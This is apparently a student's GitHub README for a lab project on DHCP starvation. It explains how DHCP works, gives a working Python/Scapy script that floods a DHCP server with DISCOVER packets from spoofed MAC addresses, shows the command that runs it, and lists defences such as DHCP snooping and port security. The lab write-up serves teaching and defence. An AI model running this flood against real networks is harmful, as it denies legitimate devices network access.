# 💀 DHCP Starvation Attack

> Python/Scapy-based DHCP Starvation attack causing DoS by exhausting the DHCP server's IP pool

![Python](https://img.shields.io/badge/Python-3.x-blue?style=flat-square&logo=python)
![Scapy](https://img.shields.io/badge/Scapy-Packet%20Crafting-green?style=flat-square)
![Layer](https://img.shields.io/badge/Layer-2%20%2F%203-orange?style=flat-square)
![Status](https://img.shields.io/badge/Status-Complete-brightgreen?style=flat-square)

---

## 📌 Overview

This project demonstrates a **DHCP Starvation Attack** — a network-level Denial of Service attack that exhausts a DHCP server's IP address pool by flooding it with DISCOVER messages, each using a different spoofed MAC address.

The attack was implemented using a custom Python script built with Scapy, tested in a GNS3 lab environment.

---

## 🎯 How DHCP Works

The normal DHCP process follows four steps:

| Step | Message | Description |
|------|---------|-------------|
| 1 | DISCOVER | Client broadcasts "Is there a DHCP server?" |
| 2 | OFFER | Server offers an available IP address |
| 3 | REQUEST | Client requests the offered IP |
| 4 | ACKNOWLEDGE | Server confirms and assigns the IP |

---

## ⚔️ How the Attack Works

1. The attacker sends thousands of DHCP DISCOVER messages
2. Each message uses a **different spoofed MAC address**
3. The DHCP server assigns a unique IP to each request
4. The IP pool becomes **completely exhausted**
5. Legitimate devices can no longer obtain an IP address → **DoS achieved**

**Layers affected:**
- **Layer 3** — IP address pool exhaustion
- **Layer 2** — MAC address table flooding on the switch

---

## 🖥️ Lab Environment

| Device | Role | OS |
|--------|------|----|
| Attacker | Runs Python attack script | Kali Linux |
| Victim | DHCP Server | Metasploitable 2 |
| Network Device | Switch (MAC table flooded) | GNS3 Switch |

All devices connected via **GNS3 virtual network**.

---

## 🛠️ Technologies Used

| Tool | Purpose |
|------|---------|
| Python 3 | Core programming language |
| Scapy | Packet crafting and sending |
| GNS3 | Network simulation environment |
| Kali Linux | Attacker machine |
| Metasploitable 2 | Victim / DHCP server |

---

## 🐍 Attack Script

```python
from scapy.all import Ether, IP, UDP, BOOTP, DHCP, RandMAC, sendp, conf
import random
import time
import argparse

def generate_random_mac():
    return RandMAC()

def create_dhcp_discover(mac_str):
    mac_bytes = bytes.fromhex(mac_str.replace(":", ""))
    packet = (
        Ether(src=mac_str, dst="ff:ff:ff:ff:ff:ff") /
        IP(src="0.0.0.0", dst="255.255.255.255") /
        UDP(sport=68, dport=67) /
        BOOTP(op=1, chaddr=mac_bytes + b'\x00' * 10,
              xid=random.randint(1, 0xFFFFFFFF)) /
        DHCP(options=[
            ("message-type", "discover"),
            ("hostname", "host-" + str(random.randint(1000, 9999))),
            ("param_req_list", [1, 3, 6, 15, 28, 51]),
            "end"
        ])
    )
    return packet

def dhcp_starvation(interface, count=1000, delay=0.01):
    conf.verb = 0
    for i in range(count):
        mac = str(generate_random_mac())
        packet = create_dhcp_discover(mac)
        sendp(packet, iface=interface, verbose=False)
```

### Run the Attack

```bash
sudo python3 dhcp.py -i eth0 -c 1000 -d 0.01
```

---

## 📊 Results

- ✅ MAC address table flooded with hundreds of spoofed entries
- ✅ DHCP IP pool fully exhausted
- ✅ Legitimate devices unable to obtain IP addresses
- ✅ DoS condition successfully demonstrated

---

## 🛡️ Prevention

- Enable **DHCP Snooping** on switches
- Limit DHCP requests per port
- Configure **Port Security** to restrict MAC addresses per port
- Disable unused switch ports

---

## 📁 Project Structure

```
dhcp-starvation-attack/
├── README.md              # Project documentation
├── dhcp.py                # Attack script
└── report/
    └── DHCP_Attack_Report.pdf
```

---

## ⚠️ Disclaimer

This project was developed strictly for educational purposes in a controlled lab environment. Do not use against systems you do not own or have explicit permission to test.

---

## 👤 Author

**Ahmad** — Cybersecurity & Networking Student

[![LinkedIn](https://img.shields.io/badge/LinkedIn-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/fadi-morad-775384381)
[![GitHub](https://img.shields.io/badge/GitHub-181717?style=flat-square&logo=github&logoColor=white)](https://github.com/Ahmad-Cyber8)
